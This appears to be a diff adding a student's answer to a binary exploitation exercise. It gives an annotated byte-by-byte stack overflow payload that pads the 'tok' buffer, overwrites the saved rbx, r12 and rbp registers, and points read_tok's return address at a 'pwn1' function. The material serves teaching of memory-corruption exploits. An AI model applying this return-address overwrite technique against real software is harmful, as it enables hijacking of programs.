@@ -1,0 +1,20 @@
+Q. Your exploit explanation below.
+Change return address of read_tok to pwn1, read_tok will jump to pwn1 when hitting ret instruction 
+61 00 -- a (text) number and 0 byte for eval_token (still in tok)
+ff ff ff ff ff ff -- padding for tok
+ff ff ff ff ff ff ff ff -- padding for tok
+ff ff ff ff ff ff ff ff -- padding for tok
+ff ff ff ff ff ff ff ff -- padding for tok
+ff ff ff ff ff ff ff ff -- padding for tok
+ff ff ff ff ff ff ff ff -- padding for tok
+ff ff ff ff ff ff ff ff -- padding for tok
+ff ff ff ff ff ff ff ff -- padding for tok
+ff ff ff ff ff ff ff ff -- padding for tok
+ff ff ff ff ff ff ff ff -- padding for tok
+ff ff ff ff ff ff ff ff -- padding for tok
+ff ff ff ff ff ff ff ff -- padding for tok
+ff ff ff ff ff ff ff ff -- overwrite value of previous rbx
+ff ff ff ff ff ff ff ff -- overwrite value of previous r12
+ff ff ff ff ff ff ff ff -- overwrite value of previous rbp
+5f 1c 40 00 00 00 00 00 -- change return address to pwn1
+
